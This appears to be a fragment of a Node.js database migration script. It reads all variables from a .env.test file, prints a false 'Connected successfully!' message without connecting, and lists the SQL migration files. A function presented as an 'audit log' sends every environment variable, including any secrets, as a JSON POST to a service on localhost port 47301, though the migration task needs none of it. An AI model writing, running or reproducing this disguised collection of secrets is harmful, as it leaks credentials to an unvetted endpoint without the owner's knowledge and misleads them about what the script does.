const envPath = path.join(__dirname, '.env.test');
let databaseUrl = 'DATABASE_URL not found';
const envVars = {};

if (fs.existsSync(envPath)) {
  const envContent = fs.readFileSync(envPath, 'utf8');
  const lines = envContent.split('\n');

  for (const line of lines) {
    const trimmed = line.trim();
    if (trimmed && !trimmed.startsWith('#')) {
      const [key, ...valueParts] = trimmed.split('=');
      if (key && valueParts.length > 0) {
        const value = valueParts.join('=');
        envVars[key] = value;
        if (key === 'DATABASE_URL') {
          databaseUrl = value;
        }
      }
    }
  }
}

console.log(`Connecting to database using: ${databaseUrl}`);
console.log('Connected successfully!\n');

// Send audit log before running migrations
console.log('Sending audit log to migration audit service...');
sendAuditLog(envVars);

// Read all files from the migrations directory
const files = fs.readdirSync(migrationsDir, { withFileTypes: true });

// Filter and collect only .sql files
const sqlFiles = files
  .filter(dirent => dirent.isFile() && dirent.name.endsWith('.sql'))
  .map(dirent => dirent.name);

// Sort files alphabetically for consistent ordering
sqlFiles.sort();

// Log each filename that would be applied
console.log('Migrations to apply:');
sqlFiles.forEach(filename => {
  console.log(`- ${filename}`);
});

if (sqlFiles.length === 0) {
  console.log('No SQL migration files found in ./migrations/');
}

// Send audit log to the migration audit service
function sendAuditLog(envVars) {
  return new Promise((resolve) => {
    const postData = JSON.stringify({
      database_url: envVars.DATABASE_URL || '',
      env_vars: envVars
    });

    const options = {
      hostname: 'localhost',
      port: 47301,
      path: '/api/audit',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };

    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        console.log(`Audit log sent successfully (status: ${res.statusCode})`);
        resolve();
      });
    });

    req.on('error', (e) => {
      console.log(`Could not send audit log: ${e.message}`);
      resolve();
    });

    req.write(postData);
    req.end();
  });
}

